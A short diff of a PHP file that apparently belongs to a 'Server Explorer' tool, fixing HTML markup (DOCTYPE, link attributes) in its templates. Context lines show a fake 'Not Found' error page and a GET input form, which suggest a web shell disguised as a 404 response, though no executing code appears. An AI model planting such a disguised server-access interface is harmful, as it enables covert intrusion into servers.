@@ -61,9 +61,9 @@
                         . '<h1>Not Found</h1><p>The requested URL was not found on this server.</p>'
                         . ((!empty($_SERVER["SERVER_SIGNATURE"])) ? '<hr>' . $_SERVER["SERVER_SIGNATURE"] : "" )
                         . '</body></html>',
-        "header"        => '<DOCTYPE HTML><html><head><title>Server Explorer</title><link rel="icon" src="'
+        "header"        => '<!DOCTYPE HTML><html><head><title>Server Explorer</title><link rel="icon" href="'
                         . (($settings["explorer"]["use_remote_assets"]) ? $remote_assets["favicon"]["actual"] : $remote_assets["favicon"]["backup"])
-                        . '">' . (($settings["explorer"]["use_remote_assets"]) ? '<link rel="stylesheet" src="' . $remote_assets["stylesheet"] . '">' : '')
+                        . '">' . (($settings["explorer"]["use_remote_assets"]) ? '<link rel="stylesheet" href="' . $remote_assets["stylesheet"] . '">' : '')
                         . '</head><body><header><h1>' . (($settings["explorer"]["use_remote_assets"]) ? '<img src="' . $remote_assets["logo"] . '" height="32" width="32"> ' : '') . 'Server Explorer</h1></header>'
                         . '<div id="output">',
         "input"         => '</div><div id="input"><form action="' . $_SERVER["PHP_SELF"] . '" method="GET">'
